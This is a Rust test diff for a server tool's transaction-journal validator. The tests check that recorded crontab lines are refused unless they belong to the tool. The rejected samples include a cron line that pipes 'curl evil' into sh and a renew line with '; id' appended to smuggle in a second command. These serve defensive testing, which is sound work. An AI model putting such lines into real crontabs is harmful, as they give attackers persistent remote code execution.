@@ -52,6 +52,28 @@ fn v3_journal() -> Journal {
     )
 }
 
+/// [`v3_journal`] with a real `renew` line for `paths` (what `validate`
+/// requires of the journaled cron lines).
+fn v3_journal_for(paths: &Paths) -> Journal {
+    let Journal::V2(mut journal) = v3_journal() else {
+        unreachable!()
+    };
+    journal.cron.lines = vec![renew_line(paths)];
+    Journal::V2(journal)
+}
+
+fn renew_line(paths: &Paths) -> String {
+    crate::host::cron::line(
+        "17 4 * * *",
+        paths,
+        crate::host::init::InitSystem::Systemd,
+        &["renew", "--cron"],
+        &paths.log.join("renew.log"),
+        &crate::host::cron::Tag::renew(),
+    )
+    .unwrap()
+}
+
 fn keys(path: &Path) -> Vec<String> {
     let doc: Value = serde_json::from_slice(&fs::read(path).unwrap()).unwrap();
     doc.as_object().unwrap().keys().cloned().collect()
@@ -424,7 +446,7 @@ fn validate_checks_everything_a_rollback_needs_before_it_starts() {
     fs::create_dir(dir(&paths)).unwrap();
     let node = snapshot::node_allowlist(&paths);
     let taken = take(&snapshot::node_targets(&paths), &files_dir(&paths), &node).unwrap();
-    let Journal::V2(mut v3) = v3_journal() else {
+    let Journal::V2(mut v3) = v3_journal_for(&paths) else {
         unreachable!()
     };
     v3.snapshot = taken;
@@ -441,4 +463,92 @@ fn validate_checks_everything_a_rollback_needs_before_it_starts() {
     v3.active_services.push("sshd".into());
     let err = Journal::V2(v3).validate(&paths).unwrap_err();
     assert_eq!(err.to_string(), "事务日志含未知服务");
+}
+
+/// A v2 journal of the fixture layout whose snapshot is in `files/`, with
+/// the deployment's acme.sh home.
+fn v2_journal_on_disk(root: &Path) -> (Paths, Value, Allowlist) {
+    let paths = build_v2_layout(root);
+    fs::create_dir(dir(&paths)).unwrap();
+    let allow = v2_node_allowlist_with(&paths, &[acme_home(root)]);
+    let mut targets = v2_fixed_targets(&paths);
+    targets.push(acme_deployment(root));
+    let taken = take(&targets, &files_dir(&paths), &allow).unwrap();
+    let mut doc: Value = serde_json::from_str(&v2_journal_text(root)).unwrap();
+    doc["snapshot"] = serde_json::to_value(&taken).unwrap();
+    (paths, doc, allow)
+}
+
+#[test]
+fn validate_refuses_cron_lines_a_rollback_could_not_restore() {
+    let dir_ = tmp();
+    let root = dir_.path();
+    let (paths, base, allow) = v2_journal_on_disk(root);
+    let exe = paths.executable.display().to_string();
+    let v2_boot = |exe: &str| {
+        format!(
+            "@reboot env ONEBOX_DIR='{}' '{exe}' service onebox-xray start >/dev/null 2>&1 # onebox-rust:onebox-xray",
+            paths.root.display()
+        )
+    };
+    let v2_cert = format!(
+        "17 4 * * * {exe} cert renew proxy --cron >/dev/null 2>&1 # onebox-native-cert-proxy"
+    );
+    // v2's own lines (and a retired job, which is only ever kept) pass.
+    let mut doc = base.clone();
+    doc["cron_available"] = true.into();
+    doc["cron_lines"] = serde_json::json!([
+        v2_boot(&exe),
+        v2_cert,
+        "0 0 * * * /x/tls/acme/acme.sh --cron".replace("/x", &paths.root.display().to_string())
+    ]);
+    parse(&serde_json::to_vec(&doc).unwrap())
+        .unwrap()
+        .validate_with(&paths, &allow)
+        .unwrap();
+    let not_owned = "事务记录的 crontab 行不属于 Onebox，拒绝恢复";
+    let unknown = "事务记录的 crontab 行不是 Onebox 写入的格式，拒绝恢复";
+    for (line, expected) in [
+        ("* * * * * curl evil | sh".to_owned(), not_owned),
+        // FRP's lines are not the node's to restore.
+        (
+            renew_line(&paths).replace("# onebox:renew", "# onebox:frp-renew"),
+            not_owned,
+        ),
+        // The v2 autostart line of another executable.
+        (v2_boot("/opt/other/onebox"), unknown),
+        (format!("{v2_cert}; id"), not_owned),
+    ] {
+        let mut doc = base.clone();
+        doc["cron_available"] = true.into();
+        doc["cron_lines"] = serde_json::json!([line]);
+        // Loading works (recovery can report it); validation refuses it
+        // before any rollback phase.
+        let journal = parse(&serde_json::to_vec(&doc).unwrap()).unwrap();
+        let err = journal.validate_with(&paths, &allow).unwrap_err();
+        assert_eq!(err.to_string(), expected, "{line}");
+    }
+    // A v3 journal with anchors that do not match its lines.
+    let node = snapshot::node_allowlist(&paths);
+    fs::remove_dir_all(dir(&paths)).unwrap();
+    fs::create_dir(dir(&paths)).unwrap();
+    let taken = take(&snapshot::node_targets(&paths), &files_dir(&paths), &node).unwrap();
+    let Journal::V2(mut v3) = v3_journal_for(&paths) else {
+        unreachable!()
+    };
+    v3.snapshot = taken;
+    Journal::V2(v3.clone()).validate(&paths).unwrap();
+    for anchors in [vec![], vec![0, 1]] {
+        v3.cron.anchors = Some(anchors.clone());
+        let err = Journal::V2(v3.clone()).validate(&paths).unwrap_err();
+        assert_eq!(
+            err.to_string(),
+            "事务记录的 crontab 位置无效，拒绝恢复",
+            "{anchors:?}"
+        );
+    }
+    v3.cron.lines.push(renew_line(&paths));
+    v3.cron.anchors = Some(vec![3, 1]);
+    let err = Journal::V2(v3).validate(&paths).unwrap_err();
+    assert_eq!(err.to_string(), "事务记录的 crontab 位置无效，拒绝恢复");
 }
